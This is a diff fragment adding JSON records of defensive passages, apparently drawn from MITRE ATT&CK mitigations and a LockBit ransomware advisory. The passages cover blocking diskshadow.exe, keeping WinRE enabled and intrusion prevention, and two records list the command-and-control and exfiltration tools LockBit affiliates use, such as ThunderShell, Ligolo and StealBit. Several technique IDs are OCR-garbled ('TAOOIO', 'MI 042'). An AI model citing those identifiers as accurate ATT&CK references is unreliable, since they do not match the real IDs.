+    "text": "Consider using application control configured to block execution of utilities such as diskshadow.exe' that may not be required for a given system or network to prevent potential misuse by adversaries.",
+    "entries": [
+      "P062"
+    ],
+    "number": 115
+  },
+  {
+    "canonical": "cktechniquesforenterprisecommandandcontroltechniquetitleuseapplicationlayerprotocolfiletransferprotocolst1071002lockbitaffiliatesmayusefilezillaforc2applicationlayerprotocolwebprotocolst1071001lockbitaffiliatesusethundershellasaremoteaccesstoolthatcommunicatesviahttprequestsnonapplicationlayerprotocolt1095lockbitaffiliatesuseligolotoestablishsocks5ortcptunnelsfromareverseconnectionprotocoltunnelingt1572lockbitaffiliatesuseplinktoautomatesshactionsonwindowsremoteaccesssoftwaret1219lockbit30actorsuseanydeskaterarmmscreenconnectorteamviewerforc2table15lockbitaffiliatesattcktechniquesforenterpriseexfiltrationtechniquetitleuseexfiltrationtaooiolockbitaffiliatesusestealbitacustomexfiltrationtoolfirstusedwithlockbit20tostealdatafromatarget",
+    "text": "&CK Techniques for Enterprise — Command and Control Technique Title Use Application Layer Protocol: File Transfer Protocols T 1071.002 LockBit affiliates may use FileZilla for C2. Application Layer Protocol: Web Protocols T 1071.001 LockBit affiliates use ThunderShell as a remote access tool that communicates via HTTP requests. Non-Application Layer Protocol T 1095 LockBit affiliates use Ligolo to establish SOCKS5 or TCP tunnels from a reverse connection. Protocol Tunneling T 1572 LockBit affiliates use Plink to automate SSH actions on Windows. Remote Access Software T 1219 LockBit 3.0 actors use AnyDesk, Atera RMM, ScreenConnect or TeamViewer for C2. Table 15: LockBit Affiliates' ATT&CK Techniques for Enterprise — Exfiltration Technique Title Use Exfiltration TAOOIO LockBit affiliates use StealBit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target",
+    "entries": [
+      "P067"
+    ],
+    "number": 116
+  },
+  {
+    "canonical": "001lockbitaffiliatesmayuse7ziptocompressandorencryptcollecteddatapriortoexfiltrationtable14lockbitaffiliatesattcktechniquesforenterprisecommandandcontroltechniquetitleuseapplicationlayerprotocolfiletransferprotocolst1071002lockbitaffiliatesmayusefilezillaforc2applicationlayerprotocolwebprotocolst1071001lockbitaffiliatesusethundershellasaremoteaccesstoolthatcommunicatesviahttprequestsnonapplicationlayerprotocolt1095lockbitaffiliatesuseligolotoestablishsocks5ortcptunnelsfromareverseconnectionprotocoltunnelingt1572lockbitaffiliatesuseplinktoautomatesshactionsonwindowsremoteaccesssoftwaret1219lockbit30actorsuseanydeskaterarmmscreenconnectorteamviewerforc2table15lockbitaffiliatesattcktechniquesforenterprise",
+    "text": ".001 LockBit affiliates may use 7-zip to compress and/or encrypt collected data prior to exfiltration. Table 14: LockBit Affiliates' ATT&CK Techniques for Enterprise — Command and Control Technique Title Use Application Layer Protocol: File Transfer Protocols T 1071.002 LockBit affiliates may use FileZilla for C2. Application Layer Protocol: Web Protocols T 1071.001 LockBit affiliates use ThunderShell as a remote access tool that communicates via HTTP requests. Non-Application Layer Protocol T 1095 LockBit affiliates use Ligolo to establish SOCKS5 or TCP tunnels from a reverse connection. Protocol Tunneling T 1572 LockBit affiliates use Plink to automate SSH actions on Windows. Remote Access Software T 1219 LockBit 3.0 actors use AnyDesk, Atera RMM, ScreenConnect or TeamViewer for C2. Table 15: LockBit Affiliates' ATT&CK Techniques for Enterprise",
+    "entries": [
+      "P067"
+    ],
+    "number": 117
+  },
+  {
+    "canonical": "considertechnicalcontrolstopreventthedisablingofservicesordeletionoffilesinvolvedinsystemrecoveryadditionallyensurethatwinreisenabledusingthefollowingcommandcodereagentccitationreagentccmd",
+    "text": "Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. Additionally, ensure that WinRE is enabled using the following command: <code> reagentc .(Citation: reagentc_cmd)",
+    "entries": [
+      "P074"
+    ],
+    "number": 118
+  },
+  {
+    "canonical": "ensurethatunnecessaryportsandservicesareclosedtopreventriskofdiscoveryandpotentialexploitation",
+    "text": "Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation.",
+    "entries": [
+      "P078"
+    ],
+    "number": 119
+  },
+  {
+    "canonical": "attckrelease171techniquenetworkservicediscoveryt1046mitigationdisableorremovefeatureorprogrammi042",
+    "text": "ATT&CK release: 17.1 Technique: Network Service Discovery (T 1046) Mitigation: Disable or Remove Feature or Program (MI 042)",
+    "entries": [
+      "P078"
+    ],
+    "number": 120
+  },
+  {
+    "canonical": "networkintrusiondetectionandpreventionsystemsthatusenetworksignaturestoidentifytrafficforspecificadversarycommandandcontrolinfrastructureandmalwarecanbeusedtomitigateactivityatthenetworklevel",
+    "text": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.",
+    "entries": [
+      "P078"
+    ],
+    "number": 121
+  },
+  {
+    "canonical": "attckrelease171techniqueexfiltrationoveralternativeprotocolt1048mitigationnetworkintrusionpreventionm1031",
+    "text": "ATT&CK release: 17.1 Technique: Exfiltration Over Alternative Protocol (T 1048) Mitigation: Network Intrusion Prevention (M 1031)",
+    "entries": [
+      "P078"
+    ],
+    "number": 122
+  }
+]
